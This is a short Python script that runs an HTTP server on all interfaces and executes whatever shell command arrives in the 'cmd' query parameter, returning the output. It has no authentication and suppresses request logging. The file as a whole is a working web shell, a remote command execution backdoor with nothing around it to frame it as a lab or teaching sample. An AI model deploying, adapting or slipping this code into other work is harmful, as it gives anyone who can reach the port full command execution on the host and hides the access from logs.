from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import subprocess
import os

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        p = urlparse(self.path)
        qs = parse_qs(p.query)
        cmd = qs.get("cmd", ["id"])[0]
        try:
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
        except subprocess.CalledProcessError as e:
            out = e.output
        except Exception as e:
            out = str(e).encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(out)

    def log_message(self, *a):
        pass

HTTPServer(("0.0.0.0", int(os.environ.get("PORT", 8080))), Handler).serve_forever()
